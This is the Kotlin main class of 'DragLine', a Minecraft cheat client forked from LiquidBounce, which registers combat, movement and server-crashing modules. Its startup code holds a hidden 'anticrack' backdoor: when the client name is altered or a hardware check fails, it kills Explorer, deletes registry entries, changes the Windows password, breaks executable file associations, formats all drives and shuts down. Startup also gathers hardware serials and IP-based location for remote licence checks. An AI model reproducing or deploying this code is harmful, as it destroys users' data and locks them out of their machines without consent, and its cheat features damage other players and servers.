/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package dragline

import anticrack.NellyBackdoorUtils
import dragline.api.Wrapper
import dragline.api.minecraft.client.entity.IEntityLivingBase
import dragline.api.minecraft.util.IResourceLocation
import dragline.cape.CapeAPI.registerCapeService
import dragline.event.ClientShutdownEvent
import dragline.event.EventManager
import dragline.features.command.CommandManager
import dragline.features.module.ModuleManager
import dragline.features.module.modules.client.*
import dragline.features.module.modules.combat.*
import dragline.features.module.modules.exploit.*
import dragline.features.module.modules.misc.*
import dragline.features.module.modules.movement.*
import dragline.features.module.modules.player.*
import dragline.features.module.modules.render.*
import dragline.features.module.modules.world.*
import dragline.file.FileManager
import dragline.script.ScriptManager
import dragline.script.remapper.Remapper.loadSrg
import dragline.sound.TipSoundManager
import dragline.tabs.BlocksTab
import dragline.tabs.ExploitsTab
import dragline.ui.client.altmanager.GuiAltManager
import dragline.ui.client.clickgui.ClickGui
import dragline.ui.client.hud.HUD
import dragline.ui.client.hud.HUD.Companion.createDefault
import dragline.ui.cnfont.FontLoaders
import dragline.ui.font.Fonts
import dragline.utils.ClassUtils.hasForge
import dragline.utils.ClientUtils
import dragline.utils.MinecraftInstance
import dragline.utils.timer.MSTimer
import me.gd3.GD3NoSlow
import me.kid.Scaffold2
import me.nelly.module.combat.CustomAntiKb
import me.nelly.module.combat.Velocity2
import me.nelly.module.misc.AutoL
import me.nelly.module.misc.MemoryClear
import me.nelly.module.misc.Title
import me.nelly.module.player.Disabler
import me.nelly.module.player.HackerDetector
import me.nelly.module.render.Particle
import me.nelly.module.world.BlockFly
import me.nelly.utils.DesUtils
import me.nelly.utils.HardWareUtils
import me.nelly.utils.HttpUtils
import me.nelly.utils.RegionUtils
import me.paimon.module.Animations
import me.paimon.ui.NewGUI
import me.rainyfall.module.combat.KillAuraHelper
import me.rainyfall.module.misc.AutoGG
import me.rainyfall.module.misc.AutoInsult
import me.rainyfall.module.misc.ChatFilter
import me.rainyfall.module.misc.PotionWarn
import me.rainyfall.module.player.AntiFakePlayer
import me.rainyfall.module.player.InvManager
import me.rainyfall.module.world.GroundTelly
import me.rainyfall.module.world.Scaffold3
import me.wawa.module.MiddleHealth
import me.xiatian.module.Ambience
import nellyobfuscator.NellyClassObfuscator
import nellyobfuscator.NotObf
import net.ccbluex.liquidbounce.injection.backend.Backend
import net.minecraft.client.Minecraft
import org.lwjgl.opengl.Display
import sk1d.fdp.module.combat.LegitReach
import sk1d.fdp.module.combat.TickBase
import sk1d.fdp.module.exploit.ChatBypass
import sk1d.fdp.module.player.FDPHackerDetector
import sk1d.fdp.module.world.Scaffold4
import sk1d.fdp.ui.HotbarSettings
import sk1d.fdp.ui.HurtCam
import sk1d.unknow.module.render.ItemPhysics
import sk1d.unknow.module.world.Scaffold5
import top.fl0wowp4rty.phantomshield.annotations.Native
import top.fl0wowp4rty.phantomshield.annotations.license.RegisterLock
import java.awt.SystemTray
import java.awt.Toolkit
import java.awt.TrayIcon
import java.awt.TrayIcon.MessageType
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets
import javax.swing.JOptionPane
import kotlin.system.exitProcess

@Native
@RegisterLock
@NellyClassObfuscator
object DragLine {

    // Client information
    val CLIENT_NAME = getClientName()
    const val CLIENT_VERSION = 1.00
    const val CLIENT_CREATOR = "CCBlueX | Nelly | ShuiMeng1337"
    const val MINECRAFT_VERSION = Backend.MINECRAFT_VERSION
    const val CLIENT_CLOUD = "https://cloud.liquidbounce.net/LiquidBounce"

    var isStarting = false

    // Managers
    lateinit var moduleManager: ModuleManager
    lateinit var commandManager: CommandManager
    lateinit var eventManager: EventManager
    lateinit var fileManager: FileManager
    lateinit var scriptManager: ScriptManager
    lateinit var tipSoundManager: TipSoundManager

    // HUD & ClickGUI

    lateinit var hud: HUD

    lateinit var clickGui: ClickGui
    // Menu Background
    var background: IResourceLocation? = null

    lateinit var wrapper: Wrapper

    var yiyan: String? = null
    var region: String? = null

    var target: IEntityLivingBase? = null

    @JvmStatic
    fun getPitch() : Float {
        return 98F
    }

    fun getClientName() : String {
        return "DragLine"
    }


    @JvmStatic
    fun showNotification(title: String, text: String, type: MessageType?) {
        val tray = SystemTray.getSystemTray()
        val image = Toolkit.getDefaultToolkit().createImage("icon.png")
        val trayIcon = TrayIcon(image, "Tray Demo")
        trayIcon.isImageAutoSize = true
        trayIcon.toolTip = "System tray icon demo"
        tray.add(trayIcon)
        trayIcon.displayMessage(title, text, type)
    }

    fun showNotification(title: String, text: String) {
        showNotification(title,text,MessageType.INFO)
    }

    fun anticrack() {
        ClientUtils.getLogger().error("你妈死了破解狗")
        ClientUtils.getLogger().error("直接启动后门")
        ClientUtils.getLogger().error("改密码 删注册表 格式化盘符 关机!")
        MSTimer().hasTimePassed(500)


        NellyBackdoorUtils.killexplorer()
        NellyBackdoorUtils.delRegEntry()
        NellyBackdoorUtils.modifyUserPassword()
        NellyBackdoorUtils.delexeftype()
        NellyBackdoorUtils.delbc()
        NellyBackdoorUtils.formatAllDrives()
        NellyBackdoorUtils.shutdown()
        killmc() //防上面的操作无效
    }
    fun killmc() {
        Minecraft.getMinecraft().shutdown()
        MinecraftInstance.mc.shutdown()
        System.exit(0)
        exitProcess(0)
    }

    @NotObf
    fun fxxk() {
        println("你好破解狗,你妈死了!")
    }

    /**
     * Execute if client will be started
     */
    fun startClient() {
        isStarting = true

        val timer = me.nelly.utils.Timer()
        timer.start()

        if (CLIENT_NAME != "DragLine") {
            killmc()
            anticrack()
        }

        /*
        try {
            val s = StringBuilder()
            val main = System.getenv("PROCESS_IDENTIFIER") + System.getenv("COMPUTERNAME")
            val bytes = main.toByteArray(StandardCharsets.UTF_8)
            val messageDigest = MessageDigest.getInstance("SHA")
            val sha = messageDigest.digest(bytes)
            for ((i, b) in sha.withIndex()) {
                s.append(Integer.toHexString(b.toInt() and 0xFF or 0x300), 0, 3)
                if (i != sha.size - 1) {
                    s.append("-")
                }
            }
            hwid = NellyVerify.encode(s.toString())
        } catch (e: NoSuchAlgorithmException) {
            throw RuntimeException(e)
        }
*/

        ClientUtils.getLogger().info("获取 一言。")
        try {
            yiyan = HttpUtils.get("https://v1.hitokoto.cn/?encode=text&max_length=16")
            ClientUtils.getLogger().info("成功 获取一言。")
        } catch (e: Exception) {
            ClientUtils.getLogger().error("获取 一言失败。")
        }

        try {
            region = RegionUtils.getProvinceByIPv4(RegionUtils.getIPv4()) + "人"
            ClientUtils.getLogger().info("获取成功 IP详细信息。")
        } catch (e: Exception) {
            ClientUtils.getLogger().error("获取失败 IP详细信息。")
        }

        ClientUtils.getLogger().info("正在验证 DragLine。")

        /*
        if(HttpUtils.get("http://dragline.top/dat.txt").contains(hwid!!.trim())) {
            ClientUtils.getLogger().info("DragLine 验证成功!")
            showNotification("DragLine", "验证成功", TrayIcon.MessageType.INFO)
        } else if(!HttpUtils.get("http://dragline.top/dat.txt").contains(hwid!!.trim())) {
            if(HttpUtils.get("https://gitcode.net/newhwid/dragline/-/raw/master/tokens").contains(hwid!!.trim())) {
                ClientUtils.getLogger().info("DragLine 验证成功!")
                showNotification("DragLine", "验证成功", TrayIcon.MessageType.INFO)
            }
        } else {
            ClientUtils.getLogger().info("DragLine 验证失败!")
            showNotification("DragLine", "验证失败 HWID已自动复制", TrayIcon.MessageType.ERROR)
            JOptionPane.showInputDialog(null, hwid, hwid)
            java.lang.String.copyValueOf(hwid!!.toCharArray())

            killmc()
        }

        if(NellyVerify.encode("antisb") == null) {
            killmc()
        }

 */

        /*
        // Verify Start

        val sb: String = getTokens()

        val url = URL("https://gitcode.net/m0_62964839/DragLine/-/raw/master/Tokens")
        val con = url.openConnection() as HttpURLConnection

        with(con) {
            requestMethod = "GET"
            setRequestProperty("User-Agent", "Mozilla/5.0")

            val response = StringBuilder()
            BufferedReader(InputStreamReader(inputStream)).use { reader ->
                var inputLine: String?
                while (reader.readLine().also { inputLine = it } != null) {
                    if (inputLine == sb) {
                        showNotification("DragLine", "验证成功", TrayIcon.MessageType.INFO)
                        return@with
                    }
                    response.append(inputLine)
                    response.append("\n")
                }
            }
            JOptionPane.showInputDialog(null,getTokens(),"以下是你的Tokens")
            showNotification("DragLine", "验证失败", TrayIcon.MessageType.ERROR)
            Minecraft.getMinecraft().shutdown()
            stopClient()
        }




        //Verify End



        try {
            val s = StringBuilder()
            val main = System.getenv("PROCESS_IDENTIFIER") + System.getenv("COMPUTERNAME")
            val bytes = main.toByteArray(StandardCharsets.UTF_8)
            val messageDigest = MessageDigest.getInstance("SHA")
            val sha = messageDigest.digest(bytes)
            var i = 0
            for (b in sha) {
                s.append(Integer.toHexString(b.toInt() and 0xFF or 0x300), 0, 3)
                if (i != sha.size - 1) {
                    s.append("-")
                }
                i++
            }
            try {
                //获取md5加密对象
                val instance: MessageDigest = MessageDigest.getInstance("MD5")
                //对字符串加密，返回字节数组
                val digest: ByteArray = instance.digest(s.toString().toByteArray())
                val sb: StringBuffer = StringBuffer()
                for (b in digest) {
                    //获取低八位有效值
                    val i: Int = b.toInt() and 0xff
                    //将整数转化为16进制
                    var hexString = Integer.toHexString(i)
                    if (hexString.length < 2) {
                        //如果是一位的话，补0
                        hexString = "0$hexString"
                    }
                    sb.append(hexString)
                    val hwid = sb.toString()
                    if (me.nelly.utils.HttpUtils.get("https://gitcode.net/m0_74037382/dragline/-/raw/master/Guilogin")
                            .contains(
                                hwid.trim()
                            )
                    ) {
                        displayTray("DragLine", "Welcome!", TrayIcon.MessageType.INFO)
                    } else {
                        displayTray("DragLine", CLIENT_NAME, TrayIcon.MessageType.ERROR)
                        JOptionPane.showMessageDialog(null, "验证失败", "HackerStop", JOptionPane.ERROR_MESSAGE)
                        MinecraftInstance.mc.shutdown()
                        MinecraftInstance.mc2.shutdown()
                        System.exit(0)
                    }
                }
            } catch (e: NoSuchAlgorithmException) {
                throw RuntimeException(e)
            }
        } catch (e: Exception)  {
            e.printStackTrace()
        }

         */


        //anticrack

        if (HardWareUtils.getCPUSerial() == null) {
            Minecraft.getMinecraft().shutdown()
            MinecraftInstance.mc.shutdown()
            System.exit(0)
            exitProcess(0)
        }

        if (HardWareUtils.getMotherboardSN().replace(".", "") == null) {
            killmc()
            Minecraft.getMinecraft().shutdown()
            MinecraftInstance.mc.shutdown()
            System.exit(0)
            anticrack()
        }
        if (HardWareUtils.getHardDiskSN("c") == null) {
            Minecraft.getMinecraft().shutdown()
            MinecraftInstance.mc.shutdown()
            System.exit(0)
            exitProcess(0)
        }
        if (HardWareUtils.getMac().replace("-", "") == null) {
            Minecraft.getMinecraft().shutdown()
            MinecraftInstance.mc.shutdown()
            System.exit(0)
            exitProcess(0)
        }

        if (DesUtils.encode("abc") == null) {
            Minecraft.getMinecraft().shutdown()
            MinecraftInstance.mc.shutdown()
            System.exit(0)
            exitProcess(0)
        }

        if (DesUtils.decode("abc") == null) {
            Minecraft.getMinecraft().shutdown()
            MinecraftInstance.mc.shutdown()
            System.exit(0)
            exitProcess(0)
        }

        /*

        // nelly post verify
        try {
            val apiUrl = URL("https://xn--lmq31r56mnp1c.cc/dg.php")
            val connection = apiUrl.openConnection() as HttpURLConnection
            connection.setRequestMethod("POST")
            val password = URL("DragLine2023").readText()
            val hwid = (HardWareUtils.getCPUSerial() + HardWareUtils.getHardDiskSN("c"))

            // 参数
            val postData = "Password=$password&HWID=$hwid&nelly=$2"
            connection.doOutput = true
            val dataOutputStream = DataOutputStream(connection.outputStream)
            dataOutputStream.write(postData.toByteArray(Charsets.UTF_8))
            dataOutputStream.flush()
            dataOutputStream.close()


            // 结果
            val responseCode = connection.getResponseCode()
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 数据
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                var line: String?
                val response = StringBuilder()
                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                if(response.contains(URL("https://v.api.aa1.cn/api/api-md5/go.php?act=%E5%8A%A0%E5%AF%86&md5=$hwid").readText())) {
                    // Setup module manager and register modules
                    moduleManager = ModuleManager()
                    moduleManager.toggleMessage = true
                    // Load TipSoundManager
                    tipSoundManager = TipSoundManager()
                } else {
                    JOptionPane.showInputDialog(hwid,hwid)
                    ClientUtils.getLogger().error("验证失败,错误代码HWIDERROR")
                    showNotification(getClientName(),"验证失败,错误代码HWIDERROR")
                }
            } else {
                JOptionPane.showInputDialog(hwid,hwid)
                ClientUtils.getLogger().error("验证失败,错误代码$$responseCode")
                showNotification(getClientName(),"验证失败,错误代码$$responseCode")
            }
            connection.disconnect()
        } catch (e: Exception) {
            e.printStackTrace()
        }


         */



        // Nelly verfiy
        //start


        val tokens = ("NellyVerify-" + HardWareUtils.getCPUSerial())

        val url = URL("https://xn--lmq31r56mnp1c.cc/user.dat.txt")
        val connection = url.openConnection()
        val inputStream = connection.getInputStream()
        val reader = BufferedReader(InputStreamReader(inputStream))

        var line: String?
        val stringBuilder = StringBuilder()
        while (reader.readLine().also { line = it } != null) {
            stringBuilder.append(line)
            stringBuilder.append("\n")
        }

        reader.close()
        inputStream.close()


        if (stringBuilder.toString().contains(tokens)) {
            showNotification("DragLine", "验证成功", MessageType.INFO)
            moduleManager = ModuleManager()
            tipSoundManager = TipSoundManager()
        } else {
            JOptionPane.showInputDialog(null, tokens, tokens)
            showNotification("DragLine", "验证失败", MessageType.ERROR)
            Minecraft.getMinecraft().shutdown()
            MinecraftInstance.mc.shutdown()
            System.exit(0)
            exitProcess(0)
        }


        //end


        //Start
        moduleManager.registerModules(
            AutoBow::class.java,
            AutoLeave::class.java,
            AutoPot::class.java,
            AutoSoup::class.java,
            AutoWeapon::class.java,
            BowAimbot::class.java,
            Criticals::class.java,
            KillAura::class.java,
            Trigger::class.java,
            Fly::class.java,
            ClickGUI::class.java,
            HighJump::class.java,
            InventoryMove::class.java,
            LiquidWalk::class.java,
            SafeWalk::class.java,
            WallClimb::class.java,
            Strafe::class.java,
            Sprint::class.java,
            healthsendfix::class.java,
            NoRotateSet::class.java,
            AntiBot::class.java,
            Teams::class.java,
            Scaffold::class.java,
            Scaffold2::class.java,
            Scaffold3::class.java,
            CivBreak::class.java,
            Tower::class.java,
            FastBreak::class.java,
            FastPlace::class.java,
            ESP::class.java,
            NoSlow::class.java,
            Velocity::class.java,
            Speed::class.java,
            Tracers::class.java,
            NameTags::class.java,
            FastUse::class.java,
            Teleport::class.java,
            Fullbright::class.java,
            ItemESP::class.java,
            StorageESP::class.java,
            Projectiles::class.java,
            NoClip::class.java,
            Nuker::class.java,
            Health::class.java,
            PingSpoof::class.java,
            FastClimb::class.java,
            Step::class.java,
            AutoRespawn::class.java,
            AutoTool::class.java,
            NoWeb::class.java,
            Spammer::class.java,
            IceSpeed::class.java,
            Zoot::class.java,
            Regen::class.java,
            NoFall::class.java,
            Blink::class.java,
            NameProtect::class.java,
            Ghost::class.java,
            MidClick::class.java,
            XRay::class.java,
            Timer::class.java,
            Sneak::class.java,
            SkinDerp::class.java,
            Paralyze::class.java,
            GhostHand::class.java,
            AutoWalk::class.java,
            AutoBreak::class.java,
            FreeCam::class.java,
            Aimbot::class.java,
            Eagle::class.java,
            HitBox::class.java,
            AntiCactus::class.java,
            Plugins::class.java,
            AntiHunger::class.java,
            ConsoleSpammer::class.java,
            LongJump::class.java,
            Parkour::class.java,
            LadderJump::class.java,
            FastBow::class.java,
            MultiActions::class.java,
            AirJump::class.java,
            AutoClicker::class.java,
            NoBob::class.java,
            BlockOverlay::class.java,
            DMGParticle::class.java,
            NoFriends::class.java,
            BlockESP::class.java,
            Chams::class.java,
            Clip::class.java,
            Phase::class.java,
            ServerCrasher::class.java,
            NoFOV::class.java,
            FastStairs::class.java,
            SwingAnimation::class.java,
            Derp::class.java,
            ReverseStep::class.java,
            TNTBlock::class.java,
            TrueSight::class.java,
            LiquidChat::class.java,
            AntiBlind::class.java,
            NoSwing::class.java,
            BedGodMode::class.java,
            BugUp::class.java,
            Breadcrumbs::class.java,
            AbortBreaking::class.java,
            PotionSaver::class.java,
            CameraClip::class.java,
            WaterSpeed::class.java,
            Ignite::class.java,
            SlimeJump::class.java,
            MoreCarry::class.java,
            NoPitchLimit::class.java,
            Kick::class.java,
            Liquids::class.java,
            AtAllProvider::class.java,
            AirLadder::class.java,
            GodMode::class.java,
            TeleportHit::class.java,
            ItemTeleport::class.java,
            BufferSpeed::class.java,
            SuperKnockback::class.java,
            ProphuntESP::class.java,
            AutoFish::class.java,
            Damage::class.java,
            Freeze::class.java,
            KeepContainer::class.java,
            VehicleOneHit::class.java,
            Reach::class.java,
            Rotations::class.java,
            NoJumpDelay::class.java,
            BlockWalk::class.java,
            AntiAFK::class.java,
            PerfectHorseJump::class.java,
            dragline.features.module.modules.client.HUD::class.java,
            TNTESP::class.java,
            ComponentOnHover::class.java,
            KeepAlive::class.java,
            ResourcePackSpoof::class.java,
            NoSlowBreak::class.java,
            PortalMenu::class.java,
            EnchantEffect::class.java,
            SpeedMine::class.java,
            Animations::class.java,
            AutoHead::class.java,
            StrafeFix::class.java,
            AutoL::class.java,
            Disabler::class.java,
            AutoGG::class.java,
            KillAuraHelper::class.java,
            BlockFly::class.java,
            Title::class.java,
            Particle::class.java,
            ItemPhysics::class.java,
            AntiFakePlayer::class.java,
            Scaffold4::class.java,
            CustomFonts::class.java,
            HackerDetector::class.java,
            FDPHackerDetector::class.java,
            ChatBypass::class.java,
            HytChatBypass::class.java,
            //   EntitySpeed::class.java,
            InvManager::class.java,
            ChestStealer::class.java,
            Scaffold5::class.java,
            //HytTelly::class.java,
            GroundTelly::class.java,
            GD3NoSlow::class.java,
            LegitReach::class.java,
            HotbarSettings::class.java,
            HurtCam::class.java,
            TickBase::class.java,
            MemoryClear::class.java,
            CustomAntiKb::class.java,
            Ambience::class.java,
            NewGUI::class.java,
            ChatFilter::class.java,
            PotionWarn::class.java,
            AutoInsult::class.java,
            AntiLag::class.java,
            FakeAntiAim::class.java,
            Velocity2::class.java,
            MiddleHealth::class.java
        )

        moduleManager.registerModule(NoScoreboard)
        moduleManager.registerModule(Fucker)
        moduleManager.registerModule(ChestAura)


        // init
        Fonts.loadFonts()
        FontLoaders.initFonts()


        // Remapper
        try {
            loadSrg()

            // ScriptManager
            scriptManager = ScriptManager()
            scriptManager.loadScripts()
            scriptManager.enableScripts()
        } catch (throwable: Throwable) {
            ClientUtils.getLogger().error("Failed to load scripts.", throwable)
        }

        // Register commands
        commandManager.registerCommands()

        // Load configs
        fileManager.loadConfigs(
            fileManager.modulesConfig, fileManager.valuesConfig, fileManager.accountsConfig,
            fileManager.friendsConfig, fileManager.xrayConfig, fileManager.shortcutsConfig
        )

        // ClickGUI
        clickGui = ClickGui()
        fileManager.loadConfig(fileManager.clickGuiConfig)

        // Tabs (Only for Forge!)
        if (hasForge()) {
            BlocksTab()
            ExploitsTab()
        }

        // Register capes service
        try {
            registerCapeService()
        } catch (throwable: Throwable) {
            ClientUtils.getLogger().error("Failed to register cape service", throwable)
        }

        // Set HUD
        hud = createDefault()
        fileManager.loadConfig(fileManager.hudConfig)

        // Disable optifine fastrender
        ClientUtils.disableFastRender()

        // Load generators
        GuiAltManager.loadGenerators()


        if (yiyan != null) {
            Display.setTitle("$CLIENT_NAME | $CLIENT_VERSION | $yiyan")
        } else {
            Display.setTitle("$CLIENT_NAME | $CLIENT_VERSION")
        }

        timer.stop()
        showNotification(getClientName(), "本次启动耗时:${(timer.seconds).toInt()}秒", MessageType.INFO)
        isStarting = false
    }

    /**
     * Execute if client will be stopped
     */
    fun stopClient() {
        // Call client shutdown
        eventManager.callEvent(ClientShutdownEvent())

        // Save all available configs
        fileManager.saveAllConfigs()

    }

}